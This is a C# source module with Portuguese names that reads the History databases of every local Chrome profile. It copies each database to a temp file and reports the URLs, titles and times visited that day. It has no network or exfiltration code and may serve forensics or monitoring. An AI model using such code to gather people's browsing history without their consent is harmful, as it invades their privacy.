using System;
using System.IO;
using System.Text;
using Microsoft.Data.Sqlite;

namespace Teste.Modulos
{
    public class Historico
    {
        public StringBuilder Coletar()
        {
            StringBuilder resultado = new StringBuilder();

            resultado.AppendLine(
                "---------------- HISTÓRICO DO CHROME ----------------"
            );

            string localAppData =
                Environment.GetFolderPath(
                    Environment.SpecialFolder.LocalApplicationData
                );

            string chromePath = Path.Combine(
                localAppData,
                "Google",
                "Chrome",
                "User Data"
            );

            if (!Directory.Exists(chromePath))
            {
                resultado.AppendLine(
                    "Diretório do Chrome não encontrado."
                );

                return resultado;
            }

            string[] perfis =
                Directory.GetDirectories(chromePath);

            DateTime inicioDia = DateTime.Today;
            DateTime fimDia = inicioDia.AddDays(1);

            foreach (string perfil in perfis)
            {
                string nomePerfil =
                    Path.GetFileName(perfil);

                bool ehPerfil =
                    nomePerfil.Equals(
                        "Default",
                        StringComparison.OrdinalIgnoreCase
                    )
                    ||
                    nomePerfil.StartsWith(
                        "Profile ",
                        StringComparison.OrdinalIgnoreCase
                    );

                if (!ehPerfil)
                    continue;

                string caminhoHistory =
                    Path.Combine(
                        perfil,
                        "History"
                    );

                if (!File.Exists(caminhoHistory))
                    continue;

                resultado.AppendLine();
                resultado.AppendLine(
                    "============================================================"
                );
                resultado.AppendLine(
                    "PERFIL: " + nomePerfil
                );
                resultado.AppendLine(
                    "============================================================"
                );

                string copiaTemporaria =
                    Path.Combine(
                        Path.GetTempPath(),
                        "ChromeHistory_" +
                        Guid.NewGuid().ToString("N") +
                        ".db"
                    );

                try
                {
                    File.Copy(
                        caminhoHistory,
                        copiaTemporaria,
                        true
                    );

                    ConsultarHistorico(
                        copiaTemporaria,
                        inicioDia,
                        fimDia,
                        resultado
                    );
                }
                catch (Exception erro)
                {
                    resultado.AppendLine(
                        "Erro ao consultar histórico: " +
                        erro.Message
                    );
                }
                finally
                {
                    try
                    {
                        if (File.Exists(copiaTemporaria))
                            File.Delete(copiaTemporaria);
                    }
                    catch
                    {
                        // Não interrompe o relatório
                    }
                }
            }

            return resultado;
        }


        private void ConsultarHistorico(
            string banco,
            DateTime inicioDia,
            DateTime fimDia,
            StringBuilder resultado)
        {
            using SqliteConnection conexao =
                new SqliteConnection(
                    $"Data Source={banco}"
                );

            conexao.Open();

            using SqliteCommand comando =
                conexao.CreateCommand();

            /*
             * O Chrome armazena timestamps em formato
             * WebKit: microssegundos desde 01/01/1601.
             *
             * A consulta converte esse valor para
             * segundos Unix para facilitar o filtro.
             */

            long inicioUnix =
                new DateTimeOffset(
                    inicioDia
                ).ToUnixTimeSeconds();

            long fimUnix =
                new DateTimeOffset(
                    fimDia
                ).ToUnixTimeSeconds();

            long inicioChrome =
                (inicioUnix + 11644473600L) * 1000000L;

            long fimChrome =
                (fimUnix + 11644473600L) * 1000000L;


            comando.CommandText = @"
                SELECT
                    urls.url,
                    urls.title,
                    visits.visit_time
                FROM visits
                INNER JOIN urls
                    ON visits.url = urls.id
                WHERE visits.visit_time >= $inicio
                  AND visits.visit_time < $fim
                ORDER BY visits.visit_time ASC;
            ";

            comando.Parameters.AddWithValue(
                "$inicio",
                inicioChrome
            );

            comando.Parameters.AddWithValue(
                "$fim",
                fimChrome
            );


            using SqliteDataReader leitor =
                comando.ExecuteReader();

            int quantidade = 0;

            while (leitor.Read())
            {
                string url =
                    leitor.IsDBNull(0)
                        ? ""
                        : leitor.GetString(0);

                string titulo =
                    leitor.IsDBNull(1)
                        ? ""
                        : leitor.GetString(1);

                long timestamp =
                    leitor.IsDBNull(2)
                        ? 0
                        : leitor.GetInt64(2);

                DateTime data =
                    ConverterDataChrome(
                        timestamp
                    );

                quantidade++;

                resultado.AppendLine();

                resultado.AppendLine(
                    $"[{data:dd/MM/yyyy HH:mm:ss}]"
                );

                resultado.AppendLine(
                    "Título: " + titulo
                );

                resultado.AppendLine(
                    "URL: " + url
                );
            }

            resultado.AppendLine();

            resultado.AppendLine(
                "Total de registros encontrados: " +
                quantidade
            );
        }


        private DateTime ConverterDataChrome(
            long valor)
        {
            DateTime baseChrome =
                new DateTime(
                    1601,
                    1,
                    1,
                    0,
                    0,
                    0,
                    DateTimeKind.Utc
                );

            return baseChrome
                .AddTicks(valor * 10)
                .ToLocalTime();
        }
    }
}